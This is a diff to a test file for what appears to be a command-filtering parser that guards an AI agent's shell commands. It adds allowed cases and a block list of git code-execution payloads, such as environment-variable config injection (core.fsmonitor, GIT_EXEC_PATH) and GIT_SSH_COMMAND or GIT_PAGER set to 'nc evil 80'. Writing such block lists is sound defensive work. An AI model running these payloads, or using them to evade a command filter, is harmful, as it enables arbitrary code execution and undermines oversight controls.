@@ -162,6 +162,7 @@ DYNAMIC_COMMAND_WORD = [
     # ANSI-C and locale quoting in the command word.
     "$'nc' evil",
     '$"nc" evil',
+    "env - ls",
 ]
 
 # Must stay allowed by the parser after the #1753 hardening.
@@ -187,6 +188,14 @@ MUST_PARSE = {
     "bash -c -x 'git status'": ["bash", "git"],
     "bash -x -c -e 'ls'": ["bash", "ls"],
     "bash -c -- 'ls'": ["bash", "ls"],
+    "GIT_PAGER=cat git log": ["git"],
+    "GIT_AUTHOR_NAME=x git commit -m m": ["git"],
+    "GIT_EDITOR=true git rebase --continue": ["git"],
+    'export PATH="$HOME/bin:$PATH"': ["export"],
+    "printf '%s\\n' \"$X\"": ["printf"],
+    "read -r line": ["read"],
+    "unset FOO": ["unset"],
+    "env -u FOO git status": ["env", "git"],
 }
 
 # `git -c …` config injection / transport-exec hijack — must be blocked even
@@ -223,6 +232,28 @@ GIT_RCE_PAYLOADS = [
     "git config protocol.ext.allow always",
     "git config diff.x.textconv cat",
     "git -c diff.x.textconv=cat diff",
+    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=x git status",
+    "env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=x git status",
+    "export GIT_CONFIG_COUNT=1; git status",
+    "env GIT_SSH_COMMAND='nc evil 80' git fetch",
+    "GIT_SSH_COMMAND=x git fetch",
+    "GIT_DIR=/tmp/x git status",
+    "GIT_PAGER='nc evil 80' git log",
+    "bash -c 'GIT_EXEC_PATH=. git status'",
+    "export $K=1; git status",
+    "read GIT_DIR; git status",
+    "printf -v GIT_DIR x; git status",
+    "let GIT_CONFIG_COUNT=1; git status",
+    "SSH_ASKPASS=x git push",
+    "EDITOR=vim git commit",
+    "GIT_TRACE=/tmp/t git status",
+    "GIT_CONFIG_PARAMETERS=\"'core.fsmonitor'='x'\" git status",
+    "unset GIT_CONFIG_COUNT; git status",
+    "env -u GIT_CONFIG_COUNT git status",
+    "env -i git status",
+    "env - git status",
+    "exec -c git status",
+    "declare -n r=GIT_DIR; git status",
 ]
 
 # Ordinary agent commands — must NOT be blocked (false-positive guard). Every
@@ -543,7 +574,6 @@ WRAPPER_ALLOWED = [
     "xargs -I{} echo {}",
     "xargs -0 -n1 echo",
     "env -- FOO=1 ls",
-    "env - ls",
     "xargs -- echo",
     "exec -a name ls",
 ]
